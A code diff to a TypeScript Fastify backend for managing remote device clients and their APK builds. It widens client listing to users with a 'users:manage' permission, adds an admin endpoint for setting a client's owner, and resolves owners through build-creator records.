@@ -184,8 +184,9 @@ export async function deviceRoutes(app: FastifyInstance) {
     const user = (request as any).user;
 
     let rows;
-    if (user?.role === 'admin') {
-      rows = d.select().from(clients).orderBy(desc(clients.online), desc(clients.lastSeen)).all();
+    if (user?.role === 'admin' || user?.permissions?.includes('users:manage')) {
+      // Join with builds/creator where available to show which user created the APK
+      rows = d.select().from(clients).orderBy(desc(clients.online), desc(clients.lastSeen)).all(); // admin: show all clients (owner info resolved in formatClientWithOwner)
     } else {
       rows = d.select().from(clients).where(eq(clients.ownerId, user?.userId)).orderBy(desc(clients.online), desc(clients.lastSeen)).all();
     }
@@ -333,6 +334,29 @@ export async function deviceRoutes(app: FastifyInstance) {
 
     dbHelpers.addLog('INFO', 'CLIENT', `Client ${id} deleted`);
     return { success: true, message: 'Client deleted' };
+  });
+
+  // Admin: set or clear owner for a client
+  app.post('/api/client/:id/owner', {
+    preHandler: [app.auth, requirePermission('users:manage')],
+  }, async (request, reply) => {
+    const { id } = request.params as { id: string };
+    const body = (request.body || {}) as { ownerId?: number | null };
+    const ownerId = typeof body.ownerId === 'number' ? body.ownerId : null;
+
+    const d = getDb();
+    const client = d.select().from(clients).where(eq(clients.id, id)).get();
+    if (!client) return reply.code(404).send({ success: false, error: 'Client not found' });
+
+    if (ownerId !== null) {
+      const user = d.select().from(users).where(eq(users.id, ownerId)).get();
+      if (!user) return reply.code(404).send({ success: false, error: 'User not found' });
+    }
+
+    d.update(clients).set({ owner_id: ownerId }).where(eq(clients.id, id)).run();
+    dbHelpers.addLog('ADMIN', 'CLIENT', `Owner for client ${id} set to ${ownerId}`);
+
+    return { success: true };
   });
 
   app.post('/api/client/:id/credential/rotate', {
@@ -600,11 +624,29 @@ export function formatClient(client: ClientRow) {
 
 export function formatClientWithOwner(client: ClientRow) {
   const base = formatClient(client as any);
-  // owner_id may be undefined in older DB rows; normalize to owner: null or { id, username }
-  if (!client.owner_id) return { ...base, owner: null };
+  // owner_id / ownerId may be undefined in older DB rows; normalize to owner: null or { id, username }
+  const ownerId = (client as any).ownerId ?? (client as any).owner_id ?? (client as any).creatorId ?? (client as any).creator_id ?? null;
+  // If no explicit ownerId but client has build_id, try to resolve build's creator
+  if (!ownerId) {
+    try {
+      const d = getDb();
+      const buildId = (client as any).buildId ?? (client as any).build_id;
+      if (buildId) {
+        const build = d.select().from(buildRecords).where(eq(buildRecords.id, buildId)).get();
+        if (build?.creatorId || build?.creator_id) {
+          const bOwnerId = build.creatorId ?? build.creator_id;
+          const owner = d.select().from(users).where(eq(users.id, bOwnerId)).get();
+          if (owner) return { ...base, owner: { id: owner.id, username: owner.username, email: owner.email } };
+        }
+      }
+    } catch (e) {
+      // ignore lookup errors
+    }
+  }
+  if (!ownerId) return { ...base, owner: null };
   try {
     const d = getDb();
-    const owner = d.select().from(users).where(eq(users.id, client.owner_id)).get();
+    const owner = d.select().from(users).where(eq(users.id, ownerId)).get();
     if (!owner) return { ...base, owner: null };
     return { ...base, owner: { id: owner.id, username: owner.username, email: owner.email } };
   } catch {
